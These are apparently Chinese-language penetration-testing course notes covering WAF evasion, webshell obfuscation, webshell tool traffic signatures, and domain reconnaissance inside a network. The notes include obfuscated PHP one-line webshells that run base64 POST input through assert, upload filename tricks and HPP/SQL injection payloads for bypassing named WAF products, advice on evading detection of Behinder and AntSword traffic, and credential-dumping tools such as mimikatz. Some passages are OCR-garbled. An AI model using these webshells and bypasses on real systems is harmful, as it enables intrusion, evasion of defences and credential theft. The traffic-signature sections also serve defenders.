<h4 id="演示案例：-45"><a href="#演示案例：-45" class="headerlink" title="演示案例："></a>演示案例：</h4><p>漏洞利用整理库-PocOrExp&amp;CVE-CNVD<br>漏洞利用-查找库-SearchSploit&amp;PoC-in-GitHub<br>漏洞利用-模块框架-MetaSploit-.Framework(MSF)<br>漏洞利用-杂乱工具-特定图像化渗透武器库(6.1)</p>
<p>漏同利用-整理库-PocOrExp&amp;CVE-CNVD<br><a href="https://github.com/ttonys/Scrapy-CVE-CNVD">https://github.com/ttonys/Scrapy-CVE-CNVD</a><br><a href="https://github.com/ycdxsb/PocOrExp">https://github.com/ycdxsb/PocOrExp</a> in Github</p>
<p>漏同利用-查找库-SearchSploit&amp;PoC-in-GitHub<br><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a><br><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p>
<p>漏洞利用-模块框架-MetaSploit-Framework(MSF)</p>
<blockquote>
<p>利用查找：</p>
<p>基于三个信息：</p>
<p>1、漏洞信息</p>
<p>2、漏洞编号</p>
<p>3、漏洞对象</p>
<p>利用漏洞：<br>MSF漏洞利用框架</p>
<p>集成大部分的安全漏洞利用模块，直接利用MSF对漏洞进行利用</p>
<p>但是不代表所有漏洞都有集成，漏洞类型或漏洞影响等原因造成未集成</p>
<p>1、最新漏洞</p>
<p>2、漏洞复现复杂</p>
<p>3、漏洞影响过小</p>
</blockquote>
<p><a href="https://www.metasploit.com/">https://www.metasploit.com/</a><br>安装下载<br><a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html</a><br>简单使用：<br><a href="https://blog.csdn.net/weixin_42380348/article/details/123549631">https://blog.csdn.net/weixin_42380348/article/details/123549631</a></p>
<p>漏同利用-杂周工具特定图像化渗透武器库(V6.1)<br><a href="https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q">https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q</a></p>
<h1 id="第76天-WAF攻防-信息收集-识别-被动探针-代理池-仿指纹-白名单"><a href="#第76天-WAF攻防-信息收集-识别-被动探针-代理池-仿指纹-白名单" class="headerlink" title="第76天 WAF攻防-信息收集&amp;识别&amp;被动探针&amp;代理池&amp;仿指纹&amp;白名单"></a>第76天 WAF攻防-信息收集&amp;识别&amp;被动探针&amp;代理池&amp;仿指纹&amp;白名单</h1><h3 id="知识点：-52"><a href="#知识点：-52" class="headerlink" title="知识点："></a>知识点：</h3><p>1、WAF介绍&amp;模式&amp;识别&amp;防护等<br>2、信息收集被动扫描&amp;第三方接口<br>3、信息收集基于<a href="https://so.csdn.net/so/search?q=%E7%88%AC%E8%99%AB&spm=1001.2101.3001.7020">爬虫</a>&amp;文件目录探针<br>4、信息收集基于用户&amp;代理池&amp;白名单</p>
<h4 id="章节点：-6"><a href="#章节点：-6" class="headerlink" title="章节点："></a>章节点：</h4><p>WF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段，</p>
<p>补充点：<br>1、什么是WAF?<br>Web Application Firewall(web应用防火墙)，一种公认的说法是web应用防火墙通过执<br>行一系列针对HTTP&#x2F;HTTPS的安全策路来专门为web应用提供保护的一款产品。<br>基本可以分为以下4种<br>软件型WAF<br>以软件的形式安装在服务器上面，可以接触到服务器上的文件，因此就可以检服务器上<br>是否有webshell,是否有文件被创建等。<br>硬件型WAF<br>以硬件形式部署在链路中，支持多种部暑方式。当串联到链路上时可以拦截恶意流量，在<br>旁路监听模式时只记录攻击但是不进行拦截，<br>云WAF<br>一般以反向代理的形式工作，通过配置后，使对网贴的请求数据优先经过WAF主机，在<br>WAF主机对数据进行过滤后再传给服务器<br>网站内置的WAF<br>就是来自网站内部的过滤，直接出现在网站代码中，比如说对输入的参数强制类转换啊，<br>对输入的参数进行教感词检汉则阿 什么的</p>
<h4 id="演示案例：-46"><a href="#演示案例：-46" class="headerlink" title="演示案例："></a>演示案例：</h4><p>信息收集被动扫描黑暗擎&amp;三方接口<br>信息收集目录扫描-Python代理加载脚本<br>信息收集-工具扫描-Awvs&amp;Xray&amp;Goby内置</p>
<p>信息收集常见检测：<br>1、脚本或工具速度流量快<br>2、脚本或工具的指纹被识别<br>3、脚本或工具的检测Payload</p>
<p>信息收集常见方法：<br>1、延迟：解决请求过快封IP的情况<br>2、代理池：在确保速度的情况下解决请求过快封P的拦截<br>3、白名单：模拟白名单模拟WAF授权测试，解决速度及测试拦截<br>4、模拟用户：模拟真实用户数据包请求探针，解决WAF指纹识别</p>
<p>延迟设置扫描间隔</p>
<p>代理池使用proxifier代理</p>
<p>案例：安全狗存在UA白名单，即设置为百度或360爬虫的UA头有概率绕过封禁</p>
<p>信息收集被动扫描黑暗弱引擎&amp;三方接口<br>黑暗引擎：Fofa Quake Shodan zoomeye0.zone等<br>其他接口：htps:&#x2F;forum.ywhack.com&#x2F;bountytips.php?getinfo</p>
<p>信息收集目录扫描Python代理加载脚本<br>import requests<br>import time</p>
<p>xray设置代理 修改配置文件 或者使用proxifier代理软件</p>
<p>goby设置代理</p>
<h1 id="第七十七天WAF攻防-权限控制-代码免杀-异或运算-变量覆盖-混淆加密-传参"><a href="#第七十七天WAF攻防-权限控制-代码免杀-异或运算-变量覆盖-混淆加密-传参" class="headerlink" title="第七十七天WAF攻防-权限控制&amp;代码免杀&amp;异或运算&amp;变量覆盖&amp;混淆加密&amp;传参"></a>第七十七天WAF攻防-权限控制&amp;代码免杀&amp;异或运算&amp;变量覆盖&amp;混淆加密&amp;传参</h1><h4 id="知识点：-53"><a href="#知识点：-53" class="headerlink" title="知识点："></a>知识点：</h4><p>1、脚本后门基础&amp;原理<br>2、脚本后门查杀绕过机制<br>3、权限维持覆盖&amp;传参&amp;加密&amp;异或等<br>代码块&amp;传参数据&amp;工具指纹等(表面&amp;行为)<br>1、代码表面层免杀-ASP&amp;PHP&amp;JSP&amp;ASPX等<br>2、工具行为层免杀菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p>
<h4 id="章节点：-7"><a href="#章节点：-7" class="headerlink" title="章节点："></a>章节点：</h4><p>WAF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段</p>
<h4 id="补充点："><a href="#补充点：" class="headerlink" title="补充点："></a>补充点：</h4><p>1、什么是WAF?<br>Veb Application Firewall(web应用防火墙)，一种公认的说法是”web应用防火墙通过执<br>行一系列针对HTTP&#x2F;HTTPS的安全策路来专门为wb应用提供保护的一款产品。<br>基本可以分为以下4种<br>软件型WAF<br>以软件的形式安装在服务器上面，可以接触到服务器上的文件，因此就可以检测服务器上<br>是否有webshell,是否有文件被创建等。<br>硬件型WAF<br>以硬件形式部署在链路中，支持多种部暑方式。当串联到链路上时可以拦截恶意流重，在<br>旁路监听模式时只记录攻击但是不进行拦截。<br>云WAF<br>一股以反向代理的形式工作，通过配置后，使对网站的请求数据优先经过WAF主机，在<br>WAF主机对数据进行过滤后再传给服务器<br>网站内置的WAF<br>就是来自网站内部的过滤，直接出现在网站代码中，比如说对输入的参数强制类转换啊，<br>对输入的参数进行敏感词检测测啊什么的</p>
<h4 id="演示案例：-47"><a href="#演示案例：-47" class="headerlink" title="演示案例："></a>演示案例：</h4><p>基础-脚本后门控制原理代码解释<br>原理-脚本后门查杀机制-函数&amp;行为<br>代码-脚本后门免杀变异-覆盖&amp;传参<br>代码-脚本后门免杀变异-异或&amp;加密<br>拓展脚本后门脚本类型-JSP&amp;ASPX</p>
<p>基础脚本后门控制原理代码解释<br>对比工具代码菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p>
<p>原理脚本后门查杀机制函数&amp;行为<br>对比WAF规则数匹配&amp;工具指纹等</p>
<p>代码脚本后门免杀变异夏盖&amp;传参<br>1.php传参带入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$a</span>.<span class="string">&#x27;ert&#x27;</span>;</span><br><span class="line"><span class="variable">$aa</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>])):</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">?a=ass</span><br><span class="line">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<p>2.php变量覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>x&#x3D;cGhwaw5mbygpow&#x3D;&#x3D;</p>
<p>#代码脚本后门兔杀变异异或&amp;加密<br>3.php加密变异<br><a href="http://www.phpjm.net/">http://www.phpjm.net</a><br><a href="https://www.phpjms.com/">https://www.phpjms.com/</a><br><a href="http://1.15.155.76.1234/">http://1.15.155.76.1234/</a><br>思路：将webshell加密，上传过程中则不会被检测出，然后传参时使用参数加密绕过参数检测</p>
<p>4.php异或运算 无字符webshell<br>import requests<br>import time<br>import threading.queue</p>
<p>拓展即本后门脚本类型JSP&amp;ASPX</p>
<p>5.php脚本生成器<br>Webshell-venom<br>ASP PHP JSP ASPX</p>
<h1 id="第78天-WAF攻防-荚刀-冰蝎-哥斯拉-流量通讯-特征绕过-检测反制-感知"><a href="#第78天-WAF攻防-荚刀-冰蝎-哥斯拉-流量通讯-特征绕过-检测反制-感知" class="headerlink" title="第78天 WAF攻防-荚刀&amp;冰蝎&amp;哥斯拉&amp;流量通讯&amp;特征绕过&amp;检测反制&amp;感知"></a>第78天 WAF攻防-荚刀&amp;冰蝎&amp;哥斯拉&amp;流量通讯&amp;特征绕过&amp;检测反制&amp;感知</h1><h4 id="知识点：-54"><a href="#知识点：-54" class="headerlink" title="知识点："></a>知识点：</h4><p>1、菜刀-流量&amp;通讯&amp;检测8绕过<br>2、冰竭-流量&amp;通计8检测&amp;绕过<br>3、哥斯拉-流量&amp;通讯&amp;检测&amp;绕过<br>代码块&amp;传参数据&amp;工具指纹等表面&amp;行为）<br>1、代码表面层免杀-ASP&amp;PHP&amp;JSP&amp;ASPX等<br>2、工具行为层免杀菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p>
<h4 id="章节点：-8"><a href="#章节点：-8" class="headerlink" title="章节点："></a>章节点：</h4><p>WAF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段。</p>
<p>可以分为下面三种检测的，即WAF、入侵检测平台、威胁感知平台。检测的技术可以分为正则匹配、机器语言、行为分析。一般那种开源的就是用的正则匹配，或者说一些比较垃圾的项目，因为用正则匹配的话比较容易绕过，使用加密、编码、分段等操作即可绕过。这个分段就是把一些特征流量分段发送，比如他检测POST这个东西，你可以中间加点，然后分成几个去表示。而行为分析则不看你过滤的函数，而是看这个代码的最终行为是什么，然后进行分析，如果过探测到行为比较危险就会拦截，而这个机器语言也是比较高级的东西，小迪也没解释清。一般商业的都是行为分析和机器语言去检测，开源的是正则。最终的发展方向呢也是往机器语言和行为分析发展。</p>
<blockquote>
<p>正则表达式是 WAF 中最常用的技术之一，可用于实现基于模式匹配的规则和策略。</p>
<p>机器语言是计算机能够理解和执行的指令集，与高级编程语言不同，它使用二进制代码来表示操作和数据。在 WAF<br>中，机器语言可能用于处理和分析网络流量，以及执行特定的安全策略和行为分析。</p>
<p>行为分析是一种安全技术，旨在识别恶意活动和攻击，例如 SQL 注入、跨站脚本攻击等。在 WAF 中，行为分析可以通过检查 Web<br>请求的属性、参数、来源 IP 等信息，从而确定该请求是否是合法和安全的</p>
</blockquote>
<h4 id="演示案例：-48"><a href="#演示案例：-48" class="headerlink" title="演示案例："></a>演示案例：</h4><p>菜刀-流量&amp;绕过&amp;特征&amp;检测<br>waf告警日志中显示策略匹配到eval post</p>
<p>通过wireshark抓包也可以看到数据包内容</p>
<p>传入的值中xx变量经过php运行结果为base_64decode</p>
<p>1、版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2014$P0ST=$REQUEST2016可以</span><br></pre></td></tr></table></figure>

<p>2、特征：<br>数据包流量特征：<br>1,请求包，中：ua头为百度爬虫<br>2,请求体中存在eval,base64等特征字符<br>3,请求体中传递的payload为base64编码，并且存在面定的<br>QGluaV9zZXQolmRpc3BsYXIfZXJyb3JzliwiMClpO0BzZXRfdGItZV9saW1pdCgwKTtpZih<br>QSFBfVkVSUOIPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1IKDApO307<br>ZWNobygiWEBZlik7J</p>
<p>冰蝎-流量&amp;绕过&amp;特征&amp;检测<br>哥斯拉-流量&amp;绕过&amp;特征&amp;检测</p>
<p>冰竭流量&amp;绕过&amp;特征&amp;检测</p>
<p>请求正文全部为AES加密（AES加密的特则含有&#x2F;&#x2F;&#x2F;，大小写混杂，base64加密含有&#x3D;）AES加密需要知道密匙、偏移量、加密模式等</p>
<p>1、介绍<br>冰蝎利用了服务器端的脚本语言加产功能，通讯的过程中，<br>消息体内容采用AES加密，基于特征值检测的安全产品无法查出。<br>2、通讯<br>以代码Key为密匙的AES加密解密过程<br>3、<br>特征：<br>1、User-agent:代码中定义<br>2、Pragma:no-cache<br>3.Content-Type:application&#x2F;x-www-form-urlencoded<br>4、Accept<br>text&#x2F;html,application&#x2F;xhtml+xml.application&#x2F;xml:q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng.*&#x2F;;q&#x3D;0.8.a<br>5.Accept-Encoding:gzip,deflate,br<br>6 Accept-Language:zh-CN,zh;q&#x3D;0.9,en-US:q&#x3D;0.8,en;q&#x3D;0.7</p>
<p>哥斯拉流量&amp;绕过&amp;特征&amp;检测<br>1、通讯加密见图<br>2、特征：<br>1.User-Agent Mozilla&#x2F;5.0 (Windows NT 10.0;Win64;x64:rv:84.0)Gecko&#x2F;20100101<br>Firefox&#x2F;84.0<br>2.Accept text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml:q&#x3D;0.9,image&#x2F;webp,&#x2F;:q&#x3D;0.8<br>3.Accept-Language:zh-CN,zh;q&#x3D;0.8,zh-TW:q&#x3D;0.7,zh-HK:q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>4、Cookie:PHPSESSID&#x3D;ut2a51prs0470jvfe2q502o44 cookiet最后面存在-个”，”</p>
<h4 id="拓展-冰蝎流量特征"><a href="#拓展-冰蝎流量特征" class="headerlink" title="拓展 冰蝎流量特征"></a>拓展 冰蝎流量特征</h4><p>冰蝎<br>冰蝎其最大特点就是对交互流量进行AES对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测<br>1、通过密钥协商的过程中的一些特征来检测其他<br>老版冰蝎工具在连接Webshell的时候会存在一个密钥协商的过程，这个过程是纯明文的数据交换，冰蝎存在这样的特征：发起一共两次的密钥协商，通过比较两次密钥协商的返回包中内容的不同部分来获取其中的密钥。<br>在这个协商过程中，防护设备可以结合URL、请求包和返回包的内容以及头部信息来综合进行判断，这种类型检测的优势是这部分的流程是冰蝎内置的实现，攻击者不太好进行修改绕过。而劣势是在大流量的环境下很容易引起大量的误报。<br>2、通过Shell交互过程中的HTTP请求特征来检测<br>冰蝎在发送HTTP请求时存在一些特征，例如其工具中内置了17个User-Agent头，在用户没有自定义的情况下会随机选择一个发送。但是这些User-Agent头大部分是一些老版本的浏览器或设备。这个类型检测的优势是检测方式比较简单，但是在大流量的环境下很容易引起误报，一般使用多个特征相结合的方法来改善误报的情况，并且这部分的特征通常是一些弱特征，攻击者可以通过定制请求头、使用代理等方式修改冰蝎的请求包很轻易的来绕过这类的检测。<br>3、通过Webshell上传时的流量特征来检测<br>在真实的攻击场景下，攻击者通常是通过文件上传、文件写入等方式来写入冰蝎的Webshell，所以流量设备也可以通过检测攻击场景的数据包来发现冰蝎的存在。这部分的流量形式主要取决于Web应用，是攻击者不好控制的，而且通常都是以明文形式进行传输，所以比较易于检测。<br>但是这种检测方式在遇到非文件上传等漏洞时，有可能无法捕捉到Webshell的特征。<br>冰蝎3.0<br>从防守方的角度看，这些改动中对防御设备影响最大的是第1点，也就是说，3.0版本的冰蝎不在有密钥协商的过程，从原理上直接绕过了大量流量检测设备（大部分设备是通过握手的行为来检测冰蝎的流量）</p>
<p>蚁剑<br>1、编码器改造 蚁剑在数据包中实际上是将解码函数一同发送到服务端，那几个解码函数是没法加密的，所以产生一个很明显 的流量特征，蚁剑也支持使用者自定义编码器和解码器<br>2、请求头修改 蚁剑默认的数据包里都携带了特别明显的请求头信息：User-Agent: antSword&#x2F;v2.1，对WAF来说这简直 是自报家门</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>冰蝎改造将动态的AES密钥写死在webshell里，可以减少很多特征。<br>蚁剑就是将解码函数写死在webshell 里，也可以有效绕过WAF检测</p>
<h1 id="第七十九天-WAF攻防-漏洞发现-协议-代理池-Goby-AWVS-Xray"><a href="#第七十九天-WAF攻防-漏洞发现-协议-代理池-Goby-AWVS-Xray" class="headerlink" title="第七十九天 WAF攻防-漏洞发现&amp;协议&amp;代理池&amp;Goby&amp;AWVS&amp;Xray"></a>第七十九天 WAF攻防-漏洞发现&amp;协议&amp;代理池&amp;Goby&amp;AWVS&amp;Xray</h1><h4 id="知识点：-55"><a href="#知识点：-55" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Http&#x2F;s&amp;Sock5协议<br>2、Awvs Xray&amp;Goby代理<br>3、Pxoxifier进程代理使用<br>4、Safedog&amp;BT&amp;Aliyun防护</p>
<h4 id="演示案例：-49"><a href="#演示案例：-49" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Awws漏扫-Sadedog-白名单-内置<br>Awws漏扫-BT&amp;Aliyun-代理池-内置<br>Xray漏扫-BT&amp;Aliyun-Proxifier-.进程<br>Goby漏扫-BT&amp;Aliyun-Socket5-内置</p>
<p>在漏洞发现中，WAF会对三个方向进行过滤拦截：<br>1、速度流量问题<br>2、工具的指纹被识别<br>3、工具的检测Poc或Payload</p>
<p>Awvs漏扫-Sadedog-白名单-内置<br>加入白名单扫描，防Safedog拉黑IP</p>
<p>Awws漏扫-BT&amp;Aliyun-代理池-内置</p>
<p>Xray漏扫-BT&amp;Aliyun-Proxifier-.进程</p>
<p>proxifier添加代理服务器</p>
<p>添加代理规则 使得xray流量经过代理服务器访问目标站点</p>
<p>Goby漏扫-BT&amp;Aliyun-Socket5-内置</p>
<p>对于不通过https对网站或操作系统进行信息收集的程序可以使用socket5代理进行流量转发</p>
<p>sqlmay设置代理设置随机UA头</p>
<h1 id="第八十天-WAF攻防-漏洞利用-HPP污染-分块传输-垃圾数据"><a href="#第八十天-WAF攻防-漏洞利用-HPP污染-分块传输-垃圾数据" class="headerlink" title="第八十天 WAF攻防-漏洞利用&amp;HPP污染&amp;分块传输&amp;垃圾数据"></a>第八十天 WAF攻防-漏洞利用&amp;HPP污染&amp;分块传输&amp;垃圾数据</h1><h4 id="参考点："><a href="#参考点：" class="headerlink" title="参考点："></a>参考点：</h4><p>#将MySQL注入函数分为几类<br>拆分字符串函数：mid、1eft、1pad等<br>编码函数：ord、hex、a3ci等<br>运算函数：±*&#x2F;&amp;^！1 ike rlike reg等<br>空格替换部分：09、0a、0b、0c、0d等<br>关键数据函数：user（）、version（）、database（）等<br>然后将这些不同类型的函数组合拼接在一起</p>
<p>上传参数名解析：明确哪些东西能修政？<br>Content-Di3 position:一般可更改<br>name:表单参数值，不能更改<br>filename:文件名，可以更改<br>Content-Type:文件MIME,视情况更改</p>
<h4 id="演示案例：-50"><a href="#演示案例：-50" class="headerlink" title="演示案例："></a>演示案例：</h4><p>安全狗-SQL注入&amp;文件上传-知识点<br>安全狗-文件包含&amp;代码执行-知识点<br>BT&amp;Aliyun-SQL注入&amp;文件上传-知识点<br>BT&amp;Aliyun-文件包含&amp;代码执行-知识点</p>
<p>安全狗-SQL注入&amp;文件上传-知识点</p>
<p>SQL注入 <a href="https://www.cnblogs.com/cute-puli/p/11146625.html">https://www.cnblogs.com/cute-puli/p/11146625.html</a><br>关键字替换<br>使用like 代替 and<br>更换提交方式：<br>POST id&#x3D;-1 union select 1,2,3–+</p>
<p>模拟文件上传传递数据<br>分块传输：更改数据请求格式<br>前提提交方式必须为POST<br><a href="https://github.com/cOny1/chunked-coding-converter">https://github.com/cOny1/chunked-coding-converter</a><br>HPP参数污染：id&#x3D;1&#x2F;**&amp;id&#x3D;-1号20 union号203e1ect号201,2,3号23*&#x2F;</p>
<p>文件上传：换行解析&amp;垃圾溢出&amp;00干扰&amp;&#x3D;符号干扰&amp;参数模拟<br>filename&#x3D;a.php<br>filename&#x3D;”a.php<br>filename&#x3D;“a.php号%00”<br>垃圾数据；filename&#x3D;“a.php”<br>无限filename;filename&#x3D;“a,php”<br>filename&#x3D;&#x3D;“a.php”<br>filename&#x3D;“name&#x3D;’uploadfile.php”6</p>
<p>filename&#x3D;“Content-Disposition:form-data.php”<br>filename&#x3D;&#x3D;“a.php”</p>
<p>BT&amp;Aliyun-文件包含&amp;代码执行-知识点<br><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>python xsstrike.py -u<br>“<a href="http://test.xiaodi8.com/pikachu/vul/xss/xss">http://test.xiaodi8.com/pikachu/vul/xss/xss</a> reflected get.php?mes<br>sage&#x3D;1&amp;submit&#x3D;submit”–proxy<br>txt&#x3D;Sy&#x3D;str replace(‘x’,‘’,‘pxhpxinxfo（）’);assert ($y);&amp;submit&#x3D;8688<br>F응90응E4용BA응A4<br>文件包含：没什么好说的就这几种<br>…·&#x2F;…1等</p>
<p>安全狗：<br>注入ss文件上传拦截<br>rce文件包含等其他不拦截<br>宝塔：<br>注入上传拦截<br>rce文件包含Xss等其他不拦截<br>其中拦截的是关键字<br>aliyun<br>拦截的CC速度和后门信息收集和权限维持阶段拦截<br>漏洞利用他不拦截默认的版本（升级版本没测试）</p>
<p>由于这段时间去打春秋云镜的内网靶场去了，所以就先看内网的了，后边就是先从内网的知识点开始。</p>
<h1 id="第122天：内网安全-域信息收集-应用网络凭据-CS插件-Adfind-BloodHound"><a href="#第122天：内网安全-域信息收集-应用网络凭据-CS插件-Adfind-BloodHound" class="headerlink" title="第122天：内网安全-域信息收集&amp;应用网络凭据&amp;CS插件&amp;Adfind&amp;BloodHound"></a>第122天：内网安全-域信息收集&amp;应用网络凭据&amp;CS插件&amp;Adfind&amp;BloodHound</h1><h4 id="知识点：-56"><a href="#知识点：-56" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、域产生原因</p>
<p>2、内网域的区别</p>
<p>3、如何判断在域内</p>
<p>4、域内常见信息收集</p>
<p>5、域内自动化工具收集</p>
<p>-局域网&amp;工作组&amp;域环境区别</p>
<p>-域环境信息收集-应用&amp;网络&amp;服务&amp;凭据等</p>
<p>-自动化工具使用-CS 插件&amp;Adfind&amp;BloodHound</p>
<p>0x01</p>
<p>一个具有一定规模的企业，每天都可能面临员工入职和离职，因此网络管理部门经常需要</p>
<p>对域成员主机进行格式化消除磁盘的文件，然后重装系统及软件，以提供给新员工使用；</p>
<p>因此，为了便于后期交接，大多网络管理员会做好一个系统镜像盘，统一安装所有的电</p>
<p>脑，并且在安装的时候设置惯用、甚至统一的密码。</p>
<p>0x02</p>
<p>因此，域中的计算机本地管理员账号，极有可能能够登陆域中较多的计算机，本地管理员</p>
<p>的密码在服务器上后期修改的概率，远低于在个人办公电脑上的概率，而域用户权限是较</p>
<p>低的，是无法在域成员主机上安装软件的，这将会发生下面的一幕：</p>
<p>某个域用户需要使用 viso 软件进行绘图操作，于是联系网络管理员进行安装，网络管理</p>
<p>员采用域管理员身份登录了域成员主机，并帮助其安装了 viso 软件，于是这个有计算机</p>
<p>基础的员工，切换身份登录到了本地计算机的管理员，后执行 mimikatz，从内存当中抓</p>
<p>取了域管理员的密码，便成功的控制了整个域。</p>
<p>0x03</p>
<p>因此，域渗透的思路就是：通过域成员主机，定位出域控制器 IP 及域管理员账号，利用</p>
<p>域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，</p>
<p>定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进</p>
<p>而拿下域控制器、渗透整个内网。</p>
<p>–当前机器角色的判断</p>
<p>–当前机器网络环境判断</p>
<p>–当前机器角色功能判断</p>
<p>网络环境-局域网&amp;工作组&amp;域环境</p>
<p>机器角色-个人 PC&amp;文件服务器&amp;邮件服务器等</p>
<p>角色功能-任务&amp;端口&amp;服务&amp;密码&amp;漏洞&amp;配置等</p>
<p>网络环境-局域网-工作组&amp;域环境</p>
<p>机器角色-个人PC&amp;文件服务器&amp;邮件服务器等</p>
<p>角色功能-任务&amp;端口&amp;服务&amp;密码&amp;漏洞&amp;配置等</p>
<h4 id="演示案例：-51"><a href="#演示案例：-51" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 常规信息类收集-应用&amp;服务&amp;权限等</p>
<p> 架构信息类收集-网络&amp;用户&amp;域控等</p>
<p> 关键信息类收集-密码&amp;凭据&amp;口令等</p>
<p> 自动化工具探针-插件&amp;Adfind&amp;BloodHound</p>
<p>#常规信息类收集-应用&amp;服务&amp;权限等</p>
<p>更多其他收集见上图命令表</p>
<p>systeminfo 详细信息</p>
<p>netstat -ano 端口列表</p>
<p>route print 路由表</p>
<p>net start 启动服务</p>
<p>tasklist 进程列表</p>
<p>schtasks 计划任务</p>
<p>ipconfig &#x2F;all 判断存在域</p>
<p>net view &#x2F;domain 判断存在域</p>
<p>net time &#x2F;domain 判断主域</p>
<p>netstat -ano 当前网络端口开放</p>
<p>nslookup 域名 追踪来源地址</p>
<p>wmic service list brief 查询本机服务</p>
<p>net config workstation 查询当前登录域及登录用户信息</p>
<p>wmic startup get command,caption 查看已启动的程序信息</p>
<p>#架构信息类收集-网络&amp;用户&amp;域控等</p>
<p>net view &#x2F;domain 查询域列表</p>
<p>net time&#x2F;domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦</p>
<p>用来判 断主域，主域一般用做时间服务器</p>
<p>net localgroup administrators 本机管理员【通常含有域用户】</p>
<p>net user &#x2F;domain 查询域用户(当前域)</p>
<p>net group &#x2F;domain 查询域工作组</p>
<p>net group “domain computers” &#x2F;domain 查看加入域的所有计算机名</p>
<p>net group “domain admins” &#x2F;domain 查询域管理员用户组和域管用户</p>
<p>net localgroup administrators &#x2F;domain 查看域管理员</p>
<p>net group “domain controllers” &#x2F;domain 查看域控</p>
<p>net accounts &#x2F;domain 查看域密码策略</p>
<p>#关键信息类收集-密码&amp;凭据&amp;口令等</p>
<p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p>
<p>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)</p>
<p>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)，CS 插件</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p>
<p><a href="https://github.com/AlessandroZ/LaZagne/">https://github.com/AlessandroZ/LaZagne/</a></p>
<p><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p>
<p><a href="https://xenarmor.com/allinone-password-recovery-pro-software/">https://xenarmor.com/allinone-password-recovery-pro-software/</a></p>
<p>主要介绍一下域是什么，有什么用，怎么去利用</p>
<h1 id="第123天：内网安全-域防火墙-入站出站规则-不出网隧道上线-组策略对象同步"><a href="#第123天：内网安全-域防火墙-入站出站规则-不出网隧道上线-组策略对象同步" class="headerlink" title="第123天：内网安全-域防火墙&amp;入站出站规则&amp;不出网隧道上线&amp;组策略对象同步"></a>第123天：内网安全-域防火墙&amp;入站出站规则&amp;不出网隧道上线&amp;组策略对象同步</h1><h4 id="知识点：-57"><a href="#知识点：-57" class="headerlink" title="#知识点："></a>#知识点：</h4><p>0、防火墙组策略对象         入规则严格，出规则宽松</p>
<p>1、OSI 七层协议模型</p>
<p>2、正反向监听器说明        我去连接你为正向</p>
<p>3、隧道技术分层协议</p>
<p>4、CS&amp;MSF&amp;控制上线</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>我个人使用的是stowaway，这里工具有很多，自己选择即可</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<h4 id="系列点："><a href="#系列点：" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<h4 id="演示案例：-52"><a href="#演示案例：-52" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 单机-防火墙-限制端口出入站</p>
<p> 单机-防火墙-限制协议出入站</p>
<p> 域控-防火墙-组策略对象同步</p>
<p> 域控-防火墙-组策略不出网上线</p>
<h4 id="单机-防火墙-限制端口出入站"><a href="#单机-防火墙-限制端口出入站" class="headerlink" title="#单机-防火墙-限制端口出入站"></a>#单机-防火墙-限制端口出入站</h4><p>熟悉常见主机配置不出网的方式</p>
